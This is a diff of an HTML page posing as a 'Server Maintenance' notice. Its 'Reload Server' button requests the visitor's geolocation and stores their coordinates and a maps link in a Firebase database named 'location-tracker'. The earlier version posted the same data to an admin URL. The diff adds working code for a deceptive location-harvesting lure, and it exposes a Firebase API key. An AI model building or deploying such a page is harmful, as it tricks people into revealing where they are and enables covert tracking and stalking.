@@ -1,65 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Server Maintenance</title>
-    <link rel="icon" type="image/x-icon" href="favicon.ico">
-    <script>
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        function sendLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const googleMapsLink = `https://www.google.com/maps/@${latitude},${longitude},15z`;
+<title>Server Maintenance</title>
 
-            // Replace with your admin panel URL
-            const adminPanelUrl = "https://your-admin-panel-url.com/submit-location";
-            fetch(adminPanelUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    latitude: latitude,
-                    longitude: longitude,
-                    googleMapsLink: googleMapsLink
-                })
-            });
-        }
+<link rel="icon" type="image/x-icon" href="favicon.ico">
 
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("User denied the request for Geolocation.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Location information is unavailable.");
-                    break;
-                case error.TIMEOUT:
-                    alert("The request to get user location timed out.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");
-                    break;
-            }
-        }
-    </script>
 </head>
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
 
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+<body>
+
+<h1>This server is currently under maintenance.</h1>
+
+<button onclick="requestLocation()">Reload Server</button>
+
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import { 
+    getFirestore, 
+    collection, 
+    addDoc,
+    serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+// Firebase Configuration
+
 const firebaseConfig = {
   apiKey: "AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
   authDomain: "location-tracker-1aa74.firebaseapp.com",
@@ -70,10 +41,81 @@ const firebaseConfig = {
   measurementId: "G-DNSW7LGEYV"
 };
 
-// Initialize Firebase
+
 const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);<body>
-    <h1>This server is currently under maintenance.</h1>
-    <button onclick="requestLocation()">Reload Server</button>
+
+const db = getFirestore(app);
+
+
+console.log("Firebase Connected");
+
+
+// Location Request
+
+window.requestLocation = function(){
+
+    if(navigator.geolocation){
+
+        navigator.geolocation.getCurrentPosition(
+            saveLocation,
+            locationError
+        );
+
+    }else{
+
+        alert("Location not supported");
+
+    }
+
+};
+
+
+
+async function saveLocation(position){
+
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+
+
+    const mapsLink =
+    `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+
+    try{
+
+        await addDoc(collection(db,"locations"),{
+
+            latitude: latitude,
+            longitude: longitude,
+            maps: mapsLink,
+            time: serverTimestamp()
+
+        });
+
+
+        alert("Location saved successfully");
+
+
+    }catch(error){
+
+        console.log(error);
+        alert("Database error");
+
+    }
+
+}
+
+
+
+function locationError(error){
+
+    alert("Location permission denied");
+
+}
+
+
+</script>
+
+
 </body>
 </html>
